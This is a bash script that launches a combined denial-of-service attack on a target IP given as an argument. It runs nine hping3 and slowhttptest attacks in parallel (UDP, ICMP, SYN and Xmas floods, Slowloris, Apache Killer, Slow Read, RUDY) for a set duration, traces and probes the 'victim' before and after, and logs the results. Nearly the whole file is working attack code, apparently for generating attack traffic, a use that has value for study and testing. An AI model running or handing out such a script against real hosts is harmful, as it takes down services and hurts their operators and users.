#!/bin/bash

#Import variables from file
source variables.sh

function crash {
    echo "Attack stopped"| ts "[%b %d %H:%M:%.S]" | tee -a $attack_log
    exit
}

trap crash 0

#Define variables
attack_type=$1
curl_log="/home/output/logs/"$attack_type"_curl.log"
traceroute_log="/home/output/logs/"$attack_type"_traceroute.log"
attack_log="/home/output/logs/"$attack_type".log"
attack_duration=$2 # in seconds
destination_ip=$3
attack_stats_log1="/home/output/logs/"$attack_type"1_stats.log"
attack_stats_log2="/home/output/logs/"$attack_type"2_stats.log"
attack_stats_log3="/home/output/logs/"$attack_type"3_stats.log"
attack_stats_log4="/home/output/logs/"$attack_type"4_stats.log"
attack_stats_log5="/home/output/logs/"$attack_type"5_stats.log"
attack_stats_log6="/home/output/logs/"$attack_type"6_stats.log"
attack_stats_log7="/home/output/logs/"$attack_type"7_stats.log"
attack_stats_log8="/home/output/logs/"$attack_type"8_stats.log"
attack_stats_log9="/home/output/logs/"$attack_type"9_stats.log"

attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
attack_script2="slowhttptest -c 1000 -H -g -o "/home/output/SlowLoris_all" -i 10 -r 200 -u http://$destination_ip -x 24 -p 3 -l $attack_duration"
attack_script3="slowhttptest -R -g -o "/home/output/AppacheKiller_all" -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http://$destination_ip -l $attack_duration"
attack_script4="hping3 --flood -1 $destination_ip"
attack_script5="slowhttptest -c 1000 -X -g -o "/home/output/SlowRead_all" -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3 -l $attack_duration"
attack_script6="hping3 -1 --flood -C 3 -K 3 $destination_ip"
attack_script7="hping3 --flood -p $destination_port -S $destination_ip"
attack_script8="slowhttptest -c 1000 -B -g -o "/home/output/RUDY_all" -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3 -l $attack_duration"
attack_script9="hping3 --flood -p $destination_port -F -S -P -A -U -X -Y $destination_ip"


#Write to file
echo "Started traceroute to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Traceroute to the victim
traceroute $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $traceroute_log

#Write to file
echo "Finished traceroute to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

echo "Start $attack_type attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Write to file
echo "Started curl to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Curl to the victim server
curl $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $curl_log &


#Execute the attack and write the output to file
./attack.sh $attack_type $destination_ip "$attack_script1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log1 &
./attack.sh $attack_type $destination_ip "$attack_script2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log2 &
./attack.sh $attack_type $destination_ip "$attack_script3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log3 &
./attack.sh $attack_type $destination_ip "$attack_script4" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log4 &
./attack.sh $attack_type $destination_ip "$attack_script5" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log5 &
./attack.sh $attack_type $destination_ip "$attack_script6" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log6 &
./attack.sh $attack_type $destination_ip "$attack_script7" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log7 &
./attack.sh $attack_type $destination_ip "$attack_script8" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log8 &
./attack.sh $attack_type $destination_ip "$attack_script9" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_stats_log9 &

#Wait for the attack duration to be over
sleep $attack_duration

#Stop the attack
pkill -f "./attack.sh"
pgrep -f "$attack_script1" | tail -1 | xargs kill
pgrep -f "$attack_script2" | tail -1 | xargs kill
pgrep -f "$attack_script3" | tail -1 | xargs kill
pgrep -f "$attack_script4" | tail -1 | xargs kill
pgrep -f "$attack_script5" | tail -1 | xargs kill
pgrep -f "$attack_script6" | tail -1 | xargs kill
pgrep -f "$attack_script7" | tail -1 | xargs kill
pgrep -f "$attack_script8" | tail -1 | xargs kill
pgrep -f "$attack_script9" | tail -1 | xargs kill

#Write to file
echo "Stopped attack $attack_type" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Traceroute to the victim
traceroute $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $traceroute_log

#Write to file
echo "Finished traceroute to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Write to file
echo "Started curl to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Curl to the victim server
curl $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $curl_log &

pkill -f "$attack_script1"
pkill -f "$attack_script2"
pkill -f "$attack_script3"
pkill -f "$attack_script4"
pkill -f "$attack_script5"
pkill -f "$attack_script6"
pkill -f "$attack_script7"
pkill -f "$attack_script8"
pkill -f "$attack_script9"